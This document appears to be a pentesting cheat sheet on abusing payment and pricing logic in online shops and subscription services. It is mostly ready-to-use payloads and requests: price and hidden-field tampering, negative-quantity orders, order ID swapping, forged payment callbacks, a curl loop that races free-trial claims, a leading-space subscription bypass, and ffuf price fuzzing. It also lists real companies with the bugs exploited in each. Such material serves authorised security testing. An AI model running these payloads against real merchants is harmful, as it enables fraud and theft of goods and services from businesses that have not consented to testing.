---
tags:
  - high
  - logic
---

# Payment & Pricing Bypass

Manipulate payment flows via price tampering, negative quantities, order ID swapping, or state machine abuse.

## TL;DR

```json
{"item":"Premium","price":0,"quantity":-1}
```

Or intercept payment callback and replay success.

## Detection

### Map the Flow
1. Add to cart → Checkout → Payment → Confirmation
2. Identify client-controlled values: price, quantity, plan_id, order_id, currency
3. Find state gaps: failed payment → feature access
4. Check callback mechanisms: webhooks, return URLs

### Key Areas
- Checkout forms with hidden price fields
- Plan/subscription selection
- Discount/coupon application
- Payment provider integrations
- Order confirmation callbacks

## Exploitation

### Price Tampering

**Direct Manipulation:**
```http
POST /checkout
price=19900&product_id=12345
# Change to:
price=1&product_id=12345
```

**Hidden Fields:**
```html
<input type="hidden" name="amount" value="9999">
<!-- Tamper to value="1" -->
```

### Negative Quantity Attack

```json
{
  "items": [
    {"name": "Burger", "price": 1200, "quantity": 2},
    {"name": "Pudding", "price": 900, "quantity": -1}
  ],
  "total": 1870
}
```

**$0 Order:**
```json
{
  "items": [
    {"name": "Premium", "price": 4999, "quantity": 1},
    {"name": "Discount", "price": 5000, "quantity": -1}
  ]
}
```

### Plan ID Enumeration

```http
POST /subscribe
plan_id=147&amount=0
# Some plan IDs may be free/test plans
```

### Order/Payment ID Swapping

```
1. Start checkout for $1.99 → get order_id=ABC
2. Start checkout for $149 → intercept
3. Replace order_id with ABC
4. Pay $1.99, receive $149 plan
```

### Payment State Machine Abuse

```
1. Start premium subscription (insufficient funds)
2. Payment fails → notification received
3. Increase seats (also fails)
4. Cancel subscription
5. Premium features remain accessible!
```

State bug: `PAID → FAILED → CANCELLED` but features stay `ACTIVE`

### Currency Arbitrage

```http
GET /orders/new?p=214&cur=usd
# Original: €33,600
# Modified: $33,600 (same number, different currency)
```

### Response Tampering

```json
// Original
{"status": "failed", "payment_complete": false}
// Tampered
{"status": "success", "payment_complete": true}
```

### Callback/Webhook Manipulation

```http
POST /payment/callback
status=success&order_id=12345&amount=0&signature=forged
```

### UI State Cache Abuse (Uber Surge)

```
1. Open ride request in surge area (1.3x)
2. Navigate map to non-surge area
3. Click "Set pickup" (caches non-surge state)
4. Change pickup back to surge area
5. Pay non-surge price despite surge indicator
```

### Trial Racing

```bash
# Race the "Get free trial" button
for i in {1..50}; do
    curl -X POST /trial/claim -H "Cookie: session=..." &
done
# 1 trial → 6 trials
```

### Leading Space Bypass

```json
{"avatar_id": " subscription/premium-avatar-name"}
```

Space prefix bypasses subscription check if `trim()` happens AFTER validation.

## Bypasses

### Client-Side Only Validation
```javascript
// Frontend: if (price < 0) throw "Invalid";
// Backend doesn't validate
curl -X POST /checkout -d 'price=-100'
```

### Feature Flag Persistence
```
1. Features enabled optimistically during payment
2. Payment failure doesn't sync disable
3. Cancel before background sync runs
```

## Real Examples

| Target | Bug | Impact |
|--------|-----|--------|
| OLO/Upserve | Negative quantity | Reduced order price |
| Zomato | Plan ID 147 | Free premium |
| Reddit | Order ID swap | Reduced payment |
| Starbucks CH | Callback craft | Free top-up |
| Uber | Surge cache | 23% discount |
| Lemlist | Failed payment state | Premium bypass |

## Tools

| Tool | Purpose |
|------|---------|
| **Caido** | Intercept, tamper parameters |
| **Param Miner** | Hidden parameter discovery |
| **Intruder** | Plan ID/price enumeration |

**Testing:**
```bash
# Parameter fuzzing
ffuf -w prices.txt -u "https://target/checkout?price=FUZZ"

# Negative values
curl -X POST /checkout -d 'quantity=-1&price=100'
```
